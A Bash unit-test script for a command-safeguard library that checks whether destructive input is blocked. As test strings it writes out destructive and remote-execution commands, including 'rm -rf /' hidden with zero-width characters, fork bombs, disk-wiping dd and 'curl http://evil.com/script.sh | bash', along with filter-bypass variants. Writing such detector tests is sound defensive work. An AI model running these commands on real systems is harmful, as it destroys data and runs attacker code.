#!/bin/bash
# ==============================================================================
# test_safeguards.sh - Unit tests for safeguards.sh
# ==============================================================================
# Tests SEC-009A: Pattern Normalization for Destructive Operation Detection
#
# Tests:
#   1. Case variation bypass blocked (e.g., "RM -RF")
#   2. Zero-width Unicode space bypass blocked
#   3. Whitespace normalization
#   4. Legitimate content allowed
#   5. SQL injection patterns blocked
#   6. URL-encoded bypass blocked
#   7. Fork bomb variations blocked
#   8. Remote code execution patterns blocked
#   9. Commit message validation
#  10. normalize_for_matching function
#
# Usage: ./test_safeguards.sh [test_name]
# ==============================================================================

set -euo pipefail

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="${PROJECT_ROOT:-$(dirname "$(dirname "$SCRIPT_DIR")")}"
LIB_DIR="${PROJECT_ROOT}/lib"

# Test counters
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_SKIPPED=0

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

pass() {
    ((TESTS_PASSED++)) || true
    echo -e "  ${GREEN}[PASS]${NC} $1"
}

fail() {
    ((TESTS_FAILED++)) || true
    echo -e "  ${RED}[FAIL]${NC} $1"
}

skip() {
    ((TESTS_SKIPPED++)) || true
    echo -e "  ${YELLOW}[SKIP]${NC} $1"
}

# Test environment setup
TEST_DIR=$(mktemp -d)
export LOG_FILE="${TEST_DIR}/safeguards.log"
export SAFEGUARDS_DIR="${TEST_DIR}/safeguards"
export METRICS_DIR="${TEST_DIR}/metrics"
export HISTORY_DIR="${TEST_DIR}/history"
mkdir -p "$SAFEGUARDS_DIR" "$METRICS_DIR" "$HISTORY_DIR" "$(dirname "$LOG_FILE")"

cleanup() {
    rm -rf "$TEST_DIR" 2>/dev/null || true
}
trap cleanup EXIT

# Source the library
source "${LIB_DIR}/safeguards.sh"

echo ""
echo "=================================================="
echo "  SEC-009A: Pattern Normalization Tests"
echo "=================================================="
echo ""

# ==============================================================================
# Test: Case Variation Bypass
# ==============================================================================
echo "--- Case Variation Bypass Tests ---"

test_case_variation_rm() {
    if check_destructive_normalized "RM -RF /"; then
        fail "Case variation: 'RM -RF /' should be blocked"
    else
        pass "Case variation: 'RM -RF /' blocked"
    fi
}
test_case_variation_rm

test_case_variation_drop() {
    if check_destructive_normalized "DROP TABLE users"; then
        fail "Case variation: 'DROP TABLE' should be blocked"
    else
        pass "Case variation: 'DROP TABLE' blocked"
    fi
}
test_case_variation_drop

test_case_variation_mixed() {
    if check_destructive_normalized "Rm -Rf /home/*"; then
        fail "Case variation: Mixed case 'Rm -Rf' should be blocked"
    else
        pass "Case variation: Mixed case 'Rm -Rf' blocked"
    fi
}
test_case_variation_mixed

# ==============================================================================
# Test: Zero-Width Unicode Space Bypass
# ==============================================================================
echo ""
echo "--- Zero-Width Unicode Space Bypass Tests ---"

test_zero_width_space() {
    # Create string with zero-width space (U+200B) between 'r' and 'm'
    local malicious=$'r\xE2\x80\x8Bm -rf /'
    if check_destructive_normalized "$malicious"; then
        fail "Zero-width space: Bypass should be blocked"
    else
        pass "Zero-width space: Bypass blocked"
    fi
}
test_zero_width_space

test_zero_width_non_joiner() {
    # Create string with zero-width non-joiner (U+200C)
    local malicious=$'rm\xE2\x80\x8C -rf /'
    if check_destructive_normalized "$malicious"; then
        fail "Zero-width non-joiner: Bypass should be blocked"
    else
        pass "Zero-width non-joiner: Bypass blocked"
    fi
}
test_zero_width_non_joiner

test_bom_injection() {
    # Create string with BOM (U+FEFF) prefix
    local malicious=$'\xEF\xBB\xBFrm -rf /'
    if check_destructive_normalized "$malicious"; then
        fail "BOM injection: Bypass should be blocked"
    else
        pass "BOM injection: Bypass blocked"
    fi
}
test_bom_injection

# ==============================================================================
# Test: Whitespace Normalization
# ==============================================================================
echo ""
echo "--- Whitespace Normalization Tests ---"

test_multiple_spaces() {
    if check_destructive_normalized "rm    -rf    /"; then
        fail "Multiple spaces: Should be normalized and blocked"
    else
        pass "Multiple spaces: Normalized and blocked"
    fi
}
test_multiple_spaces

test_tab_spaces() {
    # Test with tabs
    local malicious=$'rm\t-rf\t/'
    if check_destructive_normalized "$malicious"; then
        fail "Tab spaces: Should be normalized and blocked"
    else
        pass "Tab spaces: Normalized and blocked"
    fi
}
test_tab_spaces

test_mixed_whitespace() {
    # Mix of spaces, tabs, and newlines normalized to single space
    local malicious=$'rm  \t -rf   /'
    if check_destructive_normalized "$malicious"; then
        fail "Mixed whitespace: Should be normalized and blocked"
    else
        pass "Mixed whitespace: Normalized and blocked"
    fi
}
test_mixed_whitespace

# ==============================================================================
# Test: Legitimate Content Allowed
# ==============================================================================
echo ""
echo "--- Legitimate Content Tests ---"

test_safe_npm_commands() {
    if ! check_destructive_normalized "npm install && npm test"; then
        fail "Safe content: 'npm install && npm test' should be allowed"
    else
        pass "Safe content: 'npm install && npm test' allowed"
    fi
}
test_safe_npm_commands

test_safe_git_commands() {
    if ! check_destructive_normalized "git add . && git commit -m 'fix'"; then
        fail "Safe content: git commands should be allowed"
    else
        pass "Safe content: git commands allowed"
    fi
}
test_safe_git_commands

test_safe_python_commands() {
    if ! check_destructive_normalized "python3 -m pytest tests/"; then
        fail "Safe content: pytest command should be allowed"
    else
        pass "Safe content: pytest command allowed"
    fi
}
test_safe_python_commands

test_safe_docker_commands() {
    if ! check_destructive_normalized "docker build -t myapp ."; then
        fail "Safe content: docker build should be allowed"
    else
        pass "Safe content: docker build allowed"
    fi
}
test_safe_docker_commands

# ==============================================================================
# Test: SQL Injection Patterns
# ==============================================================================
echo ""
echo "--- SQL Injection Pattern Tests ---"

test_drop_table() {
    if check_destructive_normalized "DROP TABLE users"; then
        fail "SQL injection: DROP TABLE should be blocked"
    else
        pass "SQL injection: DROP TABLE blocked"
    fi
}
test_drop_table

test_drop_database() {
    if check_destructive_normalized "DROP DATABASE production"; then
        fail "SQL injection: DROP DATABASE should be blocked"
    else
        pass "SQL injection: DROP DATABASE blocked"
    fi
}
test_drop_database

test_truncate_table() {
    if check_destructive_normalized "TRUNCATE TABLE sessions"; then
        fail "SQL injection: TRUNCATE TABLE should be blocked"
    else
        pass "SQL injection: TRUNCATE TABLE blocked"
    fi
}
test_truncate_table

# ==============================================================================
# Test: URL-Encoded Bypass
# ==============================================================================
echo ""
echo "--- URL-Encoded Bypass Tests ---"

test_url_encoded_rm() {
    # %72%6d = rm, %2d%72%66 = -rf
    if check_destructive_normalized "rm%20-rf%20/"; then
        fail "URL-encoded: rm -rf bypass should be blocked"
    else
        pass "URL-encoded: rm -rf bypass blocked"
    fi
}
test_url_encoded_rm

# ==============================================================================
# Test: Fork Bomb Variations
# ==============================================================================
echo ""
echo "--- Fork Bomb Pattern Tests ---"

test_fork_bomb_standard() {
    if check_destructive_normalized ":(){ :|:& };:"; then
        fail "Fork bomb: Standard pattern should be blocked"
    else
        pass "Fork bomb: Standard pattern blocked"
    fi
}
test_fork_bomb_standard

test_fork_bomb_compact() {
    if check_destructive_normalized ":(){:|:&};:"; then
        fail "Fork bomb: Compact pattern should be blocked"
    else
        pass "Fork bomb: Compact pattern blocked"
    fi
}
test_fork_bomb_compact

# ==============================================================================
# Test: Remote Code Execution Patterns
# ==============================================================================
echo ""
echo "--- Remote Code Execution Pattern Tests ---"

test_curl_pipe_bash() {
    if check_destructive_normalized "curl http://evil.com/script.sh | bash"; then
        fail "RCE: curl | bash should be blocked"
    else
        pass "RCE: curl | bash blocked"
    fi
}
test_curl_pipe_bash

test_wget_pipe_sh() {
    if check_destructive_normalized "wget http://evil.com/script.sh | sh"; then
        fail "RCE: wget | sh should be blocked"
    else
        pass "RCE: wget | sh blocked"
    fi
}
test_wget_pipe_sh

test_curl_with_flags_pipe() {
    if check_destructive_normalized "curl -fsSL http://install.com/script | bash -"; then
        fail "RCE: curl with flags | bash should be blocked"
    else
        pass "RCE: curl with flags | bash blocked"
    fi
}
test_curl_with_flags_pipe

# ==============================================================================
# Test: normalize_for_matching Function
# ==============================================================================
echo ""
echo "--- normalize_for_matching Function Tests ---"

test_normalize_lowercase() {
    local result
    result=$(normalize_for_matching "HELLO WORLD")
    if [[ "$result" == "hello world" ]]; then
        pass "Normalization: Lowercase conversion works"
    else
        fail "Normalization: Lowercase conversion failed (got: $result)"
    fi
}
test_normalize_lowercase

test_normalize_whitespace() {
    local result
    result=$(normalize_for_matching "hello    world")
    if [[ "$result" == "hello world" ]]; then
        pass "Normalization: Whitespace normalization works"
    else
        fail "Normalization: Whitespace normalization failed (got: $result)"
    fi
}
test_normalize_whitespace

test_normalize_empty() {
    local result
    result=$(normalize_for_matching "")
    if [[ -z "$result" ]]; then
        pass "Normalization: Empty input handled"
    else
        fail "Normalization: Empty input not handled correctly"
    fi
}
test_normalize_empty

# ==============================================================================
# Test: Commit Message Validation
# ==============================================================================
echo ""
echo "--- Commit Message Validation Tests ---"

test_commit_message_safe() {
    if ! validate_commit_message "feat: Add new user authentication feature"; then
        fail "Commit validation: Safe message should be allowed"
    else
        pass "Commit validation: Safe message allowed"
    fi
}
test_commit_message_safe

test_commit_message_destructive() {
    if validate_commit_message "cleanup: rm -rf / cache files"; then
        fail "Commit validation: Destructive command in message should be blocked"
    else
        pass "Commit validation: Destructive command blocked"
    fi
}
test_commit_message_destructive

test_commit_message_with_hidden_chars() {
    # Message with multiple zero-width characters (should trigger warning)
    local message=$'fix: clean\xE2\x80\x8B\xE2\x80\x8B\xE2\x80\x8B\xE2\x80\x8B\xE2\x80\x8B\xE2\x80\x8Bup cache'
    # This should pass but log a warning (we just check it doesn't block)
    if validate_commit_message "$message"; then
        pass "Commit validation: Hidden chars logged but not blocked"
    else
        fail "Commit validation: Hidden chars incorrectly blocked"
    fi
}
test_commit_message_with_hidden_chars

# ==============================================================================
# Test: check_destructive_ops Integration
# ==============================================================================
echo ""
echo "--- check_destructive_ops Integration Tests ---"

test_destructive_ops_case_insensitive() {
    if check_destructive_ops "RM -RF /home/*"; then
        fail "Integration: check_destructive_ops should catch case variations"
    else
        pass "Integration: check_destructive_ops catches case variations"
    fi
}
test_destructive_ops_case_insensitive

test_destructive_ops_legacy_pattern() {
    if check_destructive_ops "mkfs.ext4 /dev/sda"; then
        fail "Integration: check_destructive_ops should catch legacy patterns"
    else
        pass "Integration: check_destructive_ops catches legacy patterns"
    fi
}
test_destructive_ops_legacy_pattern

test_destructive_ops_safe() {
    if ! check_destructive_ops "ls -la /home/user"; then
        fail "Integration: check_destructive_ops should allow safe commands"
    else
        pass "Integration: check_destructive_ops allows safe commands"
    fi
}
test_destructive_ops_safe

# ==============================================================================
# Test: Additional Edge Cases
# ==============================================================================
echo ""
echo "--- Additional Edge Cases ---"

test_shutdown_commands() {
    if check_destructive_normalized "shutdown -h now"; then
        fail "Edge case: shutdown -h should be blocked"
    else
        pass "Edge case: shutdown -h blocked"
    fi
}
test_shutdown_commands

test_kill_init() {
    if check_destructive_normalized "kill -9 1"; then
        fail "Edge case: kill -9 1 should be blocked"
    else
        pass "Edge case: kill -9 1 blocked"
    fi
}
test_kill_init

test_chmod_777_root() {
    if check_destructive_normalized "chmod 777 /"; then
        fail "Edge case: chmod 777 / should be blocked"
    else
        pass "Edge case: chmod 777 / blocked"
    fi
}
test_chmod_777_root

test_dd_command() {
    if check_destructive_normalized "dd if=/dev/zero of=/dev/sda"; then
        fail "Edge case: dd to device should be blocked"
    else
        pass "Edge case: dd to device blocked"
    fi
}
test_dd_command

# ==============================================================================
# Summary
# ==============================================================================

echo ""
echo "=================================================="
echo "  SEC-009A Test Summary"
echo "=================================================="
echo ""
echo -e "Passed:  ${GREEN}${TESTS_PASSED}${NC}"
echo -e "Failed:  ${RED}${TESTS_FAILED}${NC}"
echo -e "Skipped: ${YELLOW}${TESTS_SKIPPED}${NC}"
echo ""

if [[ $TESTS_FAILED -gt 0 ]]; then
    echo -e "${RED}SEC-009A TESTS FAILED${NC}"
    exit 1
else
    echo -e "${GREEN}ALL SEC-009A TESTS PASSED${NC}"
    exit 0
fi
